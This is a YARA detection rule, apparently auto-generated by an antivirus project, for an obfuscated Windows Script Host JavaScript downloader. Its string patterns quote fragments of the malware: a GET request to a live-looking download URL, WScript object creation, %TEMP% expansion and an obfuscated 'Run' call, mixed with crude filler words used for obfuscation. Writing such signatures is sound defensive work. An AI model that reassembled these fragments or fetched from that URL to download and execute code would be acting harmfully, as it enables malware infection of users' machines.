rule sig_20160428_ac97f7246e7080d94d111f6ba9595456 {
  meta:
    description = "datamaliciousorder - file 20160428_ac97f7246e7080d94d111f6ba9595456.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "e62f8aec1ae10084b65508984059b8bfb0d94031cc6d6f78d46045249afe6cb3"

  strings:
    $s1  = "SodIfjBenKnxKojRsaRiw[YoqKtySvtTupPjdUwxCov](\"G\" + \"ET\", \"http://yury2.nichost.ru/i7dksa\", false);" fullword ascii
    $s2  = "function SsnOrgZljJsjUxdRhvLmh(OljLfvQjxXgoTwmDpiTgd){EcpCqqTxdCubFxaGkrZmd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s3  = "function XlnAslTlcGlxGyeBafMke() {return EcpCqqTxdCubFxaGkrZmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s4  = "function SsnOrgZljJsjUxdRhvLmh(OljLfvQjxXgoTwmDpiTgd){EcpCqqTxdCubFxaGkrZmd[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s5  = "function NrsGkzYkwJjmSsmOyrUuf(GioPfuLhzMnkAyaDoxXts, OvoJgnPnwMfyPwlKtuYgu){BmxCucGxfTkbRzsOueXbj = BmxCucGxfTkbRzsOueXbj * 1; " ascii
    $s6  = "var EcpCqqTxdCubFxaGkrZmd = function WghIkpArsZsaKpnWqwIwe() {return AvmCrgRmsYlfRktAplVwm[MoxYjnObvLdtXmkOqqEyp](\"WScript\"+\"" ascii
    $s7  = "return GioPfuLhzMnkAyaDoxXts - OvoJgnPnwMfyPwlKtuYgu;};" fullword ascii
    $s8  = "var AvmCrgRmsYlfRktAplVwm = this[\"WScript\"];" fullword ascii
    $s9  = "var EcpCqqTxdCubFxaGkrZmd = function WghIkpArsZsaKpnWqwIwe() {return AvmCrgRmsYlfRktAplVwm[MoxYjnObvLdtXmkOqqEyp](\"WScript\"+\"" ascii
    $s10 = "function XlnAslTlcGlxGyeBafMke() {return EcpCqqTxdCubFxaGkrZmd[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function NrsGkzYkwJjmSsmOyrUuf(GioPfuLhzMnkAyaDoxXts, OvoJgnPnwMfyPwlKtuYgu){BmxCucGxfTkbRzsOueXbj = BmxCucGxfTkbRzsOueXbj * 1; " ascii
    $s12 = "if (SodIfjBenKnxKojRsaRiw[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s13 = "function CefHfnGgiYvxKtaJniUyn(){return CqhQjcFrxZsjFtkHxwMda + \"\";};" fullword ascii
    $s14 = "function HzqQpgTzlKofUmnWtwGkb() {return ((RotUupUwsWdtBoxFrfPgu == true) && (RotUupUwsWdtBoxFrfPgu == ZhoEfaYdmAblIqzWxuUmk)) ?" ascii
    $s15 = "function HzqQpgTzlKofUmnWtwGkb() {return ((RotUupUwsWdtBoxFrfPgu == true) && (RotUupUwsWdtBoxFrfPgu == ZhoEfaYdmAblIqzWxuUmk)) ?" ascii
    $s16 = "} catch(SwaMamSslOgaLyoJdsLrm){};};" fullword ascii
    $s17 = "RotUupUwsWdtBoxFrfPgu = true; " fullword ascii
    $s18 = "ZajGkdLbxHwmQzkFtxGia = true;" fullword ascii
    $s19 = "return NrsGkzYkwJjmSsmOyrUuf(1 == 1 ? UyrJsjNbuJsiCojRdwTmx : 0, 1 == 1 ? SpkCxuXlbXjmTaxEasKye : 0);" fullword ascii
    $s20 = "var ZajGkdLbxHwmQzkFtxGia = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}